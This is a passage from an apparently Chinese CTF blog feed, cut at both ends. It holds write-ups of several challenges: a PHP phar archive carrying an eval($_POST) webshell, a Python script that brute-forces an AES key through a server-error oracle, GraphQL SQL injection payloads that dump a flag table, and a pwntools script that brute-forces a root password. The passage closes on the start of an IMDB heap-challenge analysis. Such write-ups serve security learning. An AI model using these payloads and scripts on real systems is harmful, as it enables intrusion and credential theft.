urllib.quote(username))</span><br></pre></td></tr></table></figure></p><p>2.直接传phar，由于开头加了东西，需要修改phar包的校验值。(<a href="http://php.net/manual/en/phar.fileformat.signature.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.signature.php</a>)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'shell.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$phar[<span class="string">'shell.php'</span>] = <span class="string">'&lt;?php eval($_POST[\'cmd\']);?&gt;'</span> ;</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>留意最后28个字节，最后4字节是固定标识，倒数4-8字节是hash类型，这里是0x02代表sha1，由于开头会增加字节，删掉最后28字节，加上增加的开头，重新计算sha1。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSha1</span><span class="params">(filename)</span>:</span> </span><br><span class="line">    sha1Obj = sha1()</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        sha1Obj.update(f.read())</span><br><span class="line">    <span class="keyword">return</span> sha1Obj.hexdigest()</span><br></pre></td></tr></table></figure></p><h3 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h3><p>可参考：<a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a></p><p><a href="http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc" target="_blank" rel="noopener">http://123.206.83.157:8000/<strong>pycache</strong>/app.cpython-35.pyc</a>反编译得到：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_key = os.environ[<span class="string">'KEY'</span>]</span><br><span class="line">flag_enc = <span class="string">'9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, flag_enc = flag_enc)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">'/'</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    req = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">None</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    key = <span class="keyword">None</span>[<span class="string">'key'</span>]</span><br><span class="line">    <span class="keyword">if</span> len(key) != len(flag_key):</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(key, flag_key):</span><br><span class="line">        <span class="keyword">if</span> ord(x) ^ ord(y):  <span class="comment">#注意这里，可以通过这里报错来确定key长度</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, <span class="string">b'0000000000000000'</span>)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(flag_enc))</span><br><span class="line">    flag = plain_text.decode(<span class="string">'utf-8'</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> jsonify(result = <span class="keyword">True</span>, flag = flag)</span><br><span class="line"></span><br><span class="line">getflag = app.route(<span class="string">'/getflag'</span>, methods = [</span><br><span class="line">    <span class="string">'POST'</span>])(getflag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><p>对于None类型，ord(None)会崩溃掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; key = [None,None]</span><br><span class="line">&gt;&gt;&gt; ord(key[1])</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: ord() expected string of length 1, but NoneType found</span><br></pre></td></tr></table></figure></p><p>JSON里面null会在python里面转换成none。</p><p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（15个null）时：false</p><p>当POST数据为<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：500 Internal Server Error，可以确定key为16位</p><p>同样，我们可以利用false和500报错来逐位爆破key</p><p>当POST数据为<code>{&quot;key&quot;:[&quot;a&quot;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：false</p><p>当POST数据为<code>{&quot;key&quot;:[&quot;5&quot;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>（16个null）时：500 Internal Server Error</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://123.206.83.157:8000/getflag"</span></span><br><span class="line">proxy = &#123;<span class="string">'http'</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</span><br><span class="line">key = [<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    key[index] = str(chr(i))</span><br><span class="line">    payload = &#123;<span class="string">"key"</span>:key&#125;</span><br><span class="line">    text = requests.post(url,json=payload,proxies=proxy).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"500 Internal Server Error"</span> <span class="keyword">in</span> text :</span><br><span class="line">      print(<span class="string">""</span>.join(key[:index+<span class="number">1</span>]))</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"true"</span> <span class="keyword">in</span> text:</span><br><span class="line">      print(<span class="string">""</span>.join(key))</span><br><span class="line">      exit()   <span class="comment">#5ecur3pPYpyPYk3y</span></span><br></pre></td></tr></table></figure><h3 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h3><p>抓包看一下post的数据，是graphql，一个查询API，编码是base32<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=&#123; getscorebyid(id: &quot;GE======&quot;)&#123; id name score &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>随便改一下<code>getscorebyxx</code>，可以看到报错发现还有<code>getscorebyyourname</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[GraphQLError(&apos;Cannot query field &quot;getscoreby222&quot; on type &quot;Query&quot;. Did you mean &quot;getscorebyid&quot; or &quot;getscorebyyourname&quot;?&apos;,)]</span><br></pre></td></tr></table></figure><p>测试发现id只能1位数，那么只能从那么入手，写个代码测试注入，hackbar无base32比较麻烦<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  base64 <span class="keyword">import</span> b32encode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://182.254.247.127:3001/graphql"</span></span><br><span class="line">payload = <span class="string">"1' or '1'='1"</span></span><br><span class="line">q = <span class="string">'&#123; getscorebyyourname(name: "%s")&#123; name score &#125; &#125;'</span>%(b32encode(payload))</span><br><span class="line">r = requests.post(url=url,data=&#123;<span class="string">"query"</span> : q&#125;)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>测试发现存在注入，<code>payload = &quot;1&#39; union select 1-- &quot;</code>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &quot;1&apos; union select 1-- &quot;), (u&apos;score&apos;, &apos;1&apos;)]))])</span><br></pre></td></tr></table></figure></p><p>常用套路测试<code>payload = &quot;1&#39; union select database()-- &quot;</code>，发现不是mysql，是sqlite。先爆一下表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;-1&apos; UNION ALL SELECT name FROM sqlite_master WHERE type=\&quot;table\&quot; limit 1,1--&quot;</span><br><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &apos;-1\&apos; UNION ALL SELECT name FROM sqlite_master WHERE type=&quot;table&quot; limit 1,1--&apos;), (u&apos;score&apos;, &apos;Secr3t_fl4g&apos;)]))])</span><br></pre></td></tr></table></figure></p><p>发现fSecr3t_fl4g表了，搞掂~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;-1&apos; UNION ALL SELECT * from Secr3t_fl4g--&quot;</span><br><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &quot;-1&apos; UNION ALL SELECT * from Secr3t_fl4g--&quot;), (u&apos;score&apos;, &apos;HITCTF&#123;fee26d3a146a404e106b1ed93156f30e&#125;&apos;)]))])</span><br></pre></td></tr></table></figure></p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to 7HxzZ login system!"</span>);</span><br><span class="line">  v4 = login();</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Login successful\nBut you have no permission to get the flag!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How can you login successful as root!\nThere must be something wrong with the login function,let me check again!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Checking......"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check() &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Don't fool me, you are not the true root user!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is your flag: "</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求输入用户名和密码，需要使用root登录，来看一下login()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">255</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Username: "</span>);</span><br><span class="line">  n = read_input_raw((<span class="keyword">int</span>)username, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Password: "</span>);</span><br><span class="line">  v3 = read_input_raw((<span class="keyword">int</span>)password, <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(username, <span class="string">"root"</span>, n) &amp;&amp; !<span class="built_in">strncmp</span>(password, <span class="string">"passwd_has_be_changed_in_remote_"</span>, v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的密码比较有问题，你输入多少位，就比较多少位，例如你只输入一位，那么就只比较第一位是不是跟root密码一样。这里可以绕过，后面还有一个check()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">"passwd_has_be_changed_in_remote_"</span>, <span class="number">0x20</span>u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Correct password!"</span>);</span><br><span class="line">    ++v1;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的密码比较就是固定32位，可以猜想真正密码是32位，可以利用login()进行逐位爆破。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'password'</span> + chr(x)</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Username:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'root'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">    p.sendline(password+chr(x))</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="keyword">print</span> a </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'successful'</span> <span class="keyword">in</span> a:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">if</span> login(j):</span><br><span class="line">                password += chr(j)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'password:'</span>,password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span> <span class="comment">#10_adhUNwj_qidACn_qdXon912_uhdq6</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easy-xor-apk&quot;&gt;&lt;a href=&quot;#easy-xor-apk&quot; class=&quot;headerlink&quot; title=&quot;easy_xor.apk&quot;&gt;&lt;/a&gt;easy_xor.apk&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;
      
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn-imdb</title>
    <link href="http://yoursite.com/2018/01/30/pwn-imdb/"/>
    <id>http://yoursite.com/2018/01/30/pwn-imdb/</id>
    <published>2018-01-30T01:58:32.000Z</published>
    <updated>2018-01-30T05:16:38.516Z</updated>
    
    <content type="html"><![CDATA[<p>blog已经搭了一段时间了，拖延症发作，一直没写。最近没做什么有意思的题，就写一下某CTF群的入群题解题思路。</p><h2 id="程序伪代码"><a href="#程序伪代码" class="headerlink" title="程序伪代码"></a>程序伪代码</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*** Welcome to IMDB ***"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    -- search for movies and TVs here\n----------------------------------------"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line">        add_tv();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">        add_movie();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line">        remove();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序基本功能是添加tv或者movie，可以删除指定name的，以及显示所有记录。</p><h3 id="add-tv"><a href="#add-tv" class="headerlink" title="add_tv"></a>add_tv</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">float</span> v1; <span class="comment">// xmm1_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0xD0</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span> *)v0, <span class="number">0</span>, <span class="number">0xD0</span>uLL);</span><br><span class="line">  *(_QWORD *)v0 = printf_tv;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV name? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x3F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">8</span>), <span class="number">0x40</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Season? "</span>);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  *(_DWORD *)(v0 + <span class="number">204</span>) = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Rating? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0xF</span>uLL, <span class="number">10</span>);</span><br><span class="line">  v1 = strtod((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0L</span>L);</span><br><span class="line">  *(<span class="keyword">float</span> *)(v0 + <span class="number">200</span>) = v1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"TV introduction? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_input((__int64)&amp;v3, <span class="number">0x7F</span>uLL, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)(v0 + <span class="number">72</span>), <span class="number">0x80</span>uLL, <span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)put_in_list(v0, <span class="number">128L</span>L) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"New TV added."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + <span class="number">16L</span>L))(v0);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><h3 id="add-movie"><a href="#add-movie" class="headerlink" title="add_movie"></a>add_movie</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_movie</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span 